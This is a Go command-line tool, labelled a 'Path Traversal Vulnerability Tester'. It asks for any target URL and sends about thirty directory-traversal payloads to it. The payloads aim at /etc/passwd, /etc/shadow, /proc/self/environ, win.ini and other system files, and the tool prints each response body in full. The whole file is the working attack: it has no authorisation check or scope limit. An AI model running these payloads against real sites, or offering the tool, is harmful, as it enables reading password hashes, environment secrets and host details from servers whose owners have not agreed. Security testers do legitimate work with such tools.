package main

import (
    "bufio"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "strings"
)

func main() {
    fmt.Println("\x1b[1;34mPath Traversal Vulnerability Tester\x1b[0m")
    fmt.Println()

    // Ask for the target website URL
    fmt.Print("\x1b[1mEnter your target website URL: \x1b[0m")
    reader := bufio.NewReader(os.Stdin)
    targetURL, _ := reader.ReadString('\n')
    targetURL = strings.TrimSpace(targetURL)

    // Payloads to test for Path Traversal vulnerability
    payloads := []string{
        "/../../etc/passwd",
        "/../../etc/shadow",
        "/../../../etc/passwd%00",
        "/../../../etc/shadow%00",
        "/../../../../../../../../../../../../etc/passwd",
        "/../../../../../../../../../../../../etc/shadow",
        "/../../../../../../../../../windows/win.ini",
        "/../../../../../../../../../boot.ini",
        "/../../../../../../../../../proc/self/environ",
        "/../../../../../../../../../proc/self/cmdline",
        "/../../../../../../../../../proc/self/status",
        "/../../../../../../../../../proc/version",
        "/../../../../../../../../../proc/sys/kernel/random/boot_id",
        "/../../../../../../../../../proc/sys/kernel/random/uuid",
        "/../../../../../../../../../etc/hosts",
        "/../../../../../../../../../etc/resolv.conf",
        "/../../../../../../../../../etc/group",
        "/../../../../../../../../../etc/hostname",
        "/../../../../../../../../../etc/networks",
        "/../../../../../../../../../etc/services",
        "/../../../../../../../../../etc/protocols",
        "/../../../../../../../../../usr/local/etc/passwd",
        "/../../../../../../../../../usr/local/etc/group",
        "/../../../../../../../../../usr/local/etc/hosts",
        "/../../../../../../../../../usr/local/etc/resolv.conf",
        "/../../../../../../../../../usr/local/etc/hostname",
        "/../../../../../../../../../usr/local/etc/networks",
        "/../../../../../../../../../usr/local/etc/services",
        "/../../../../../../../../../usr/local/etc/protocols",
    }

    // Test each payload
    fmt.Printf("\n\x1b[1mTesting for Path Traversal vulnerability on %s...\x1b[0m\n\n", targetURL)
    for _, payload := range payloads {
        fmt.Printf("\x1b[1mPayload: %s\x1b[0m\n", payload)
        response, err := http.Get(targetURL + payload)
        if err != nil {
            fmt.Printf("\x1b[31mError occurred while testing: %v\x1b[0m\n", err)
            continue
        }
        defer response.Body.Close()

        // Read response content
        body, err := ioutil.ReadAll(response.Body)
        if err != nil {
            fmt.Printf("\x1b[31mError reading response: %v\x1b[0m\n", err)
            continue
        }

        // Display response code and content
        fmt.Printf("\x1b[1mResponse Code:\x1b[0m %d\n", response.StatusCode)
        fmt.Printf("\x1b[1mResponse Content:\x1b[0m\n%s\n", string(body))
        fmt.Println()
    }
}
